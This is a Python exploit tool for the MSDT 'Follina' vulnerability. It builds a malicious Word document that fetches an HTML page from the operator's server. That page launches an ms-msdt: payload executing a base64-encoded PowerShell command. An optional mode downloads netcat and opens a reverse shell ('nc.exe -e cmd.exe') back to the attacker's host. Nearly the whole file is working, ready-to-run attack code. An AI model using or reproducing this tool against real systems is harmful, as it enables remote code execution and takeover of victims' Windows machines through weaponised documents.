#!/usr/bin/env python3

import argparse
import zipfile
import tempfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import threading
import subprocess

class ReuseTCPServer(socketserver.TCPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=serve_path, **kwargs)

    def log_message(self, format, *func_args):
        if args.reverse:
            return
        else:
            super().log_message(format, *func_args)

    def log_request(self, format, *func_args):
        if args.reverse:
            return
        else:
            super().log_request(format, *func_args)

def serve_http():
    with ReuseTCPServer(("", args.port), Handler) as httpd:
        httpd.serve_forever()

def generate_base64_payload(command):
    return base64.b64encode(command.encode("utf-8")).decode("utf-8")

def generate_html_payload(base64_payload):
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += "".join([random.choice(string.ascii_lowercase) for _ in range(4096)]) + "\n</script>"
    return html_payload

def create_maldoc(staging_dir, serve_host, serve_path, args):
    doc_suffix = "doc"
    doc_path = os.path.join(staging_dir, doc_suffix)

    shutil.copytree(doc_suffix, doc_path)
    print(f"[+] copied staging doc {staging_dir}")

    document_rels_path = os.path.join(doc_path, "word", "_rels", "document.xml.rels")

    with open(document_rels_path) as filp:
        external_referral = filp.read()

    external_referral = external_referral.replace("{staged_html}", f"http://{serve_host}:{args.port}/index.html")

    with open(document_rels_path, "w") as filp:
        filp.write(external_referral)

    shutil.make_archive(args.output, "zip", doc_path)
    os.rename(args.output + ".zip", args.output)

    print(f"[+] created maldoc {args.output}")

def main(args):
    try:
        serve_host = ipaddress.IPv4Address(args.interface)
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0]["addr"]
        except ValueError:
            print("[!] Error determining HTTP hosting address. Did you provide an interface or IP?")
            exit()

    staging_dir = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
    serve_path = os.path.join(staging_dir, "www")
    os.makedirs(serve_path)

    create_maldoc(staging_dir, serve_host, serve_path, args)

    command = args.command
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""

    base64_payload = generate_base64_payload(command)
    html_payload = generate_html_payload(base64_payload)

    with open(os.path.join(serve_path, "index.html"), "w") as filp:
        filp.write(html_payload)

    print(f"[+] Serving HTML payload on :{args.port}")

    try:
        serve_http()
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] Port {args.port} is already in use. Trying another port...")
            args.port = find_available_port()
            print(f"[+] Found available port: {args.port}")
            serve_http()

def find_available_port():
    port = random.randint(1024, 65535)
    while not is_port_available(port):
        port = random.randint(1024, 65535)
    return port

def is_port_available(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('127.0.0.1', port)) != 0

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--command", "-c", default="calc", help="Command to run on the target (default: calc)")
    parser.add_argument("--output", "-o", default="./follina.doc", help="Output maldoc file (default: ./follina.doc)")
    parser.add_argument("--interface", "-i", default="eth0", help="Network interface or IP address to host the HTTP server (default: eth0)")
    parser.add_argument("--port", "-p", type=int, default=8000, help="Port to serve the HTTP server (default: 8000)")
    parser.add_argument("--reverse", "-r", type=int, default=0, help="Port to serve reverse shell on")

    args = parser.parse_args()
    main(args)
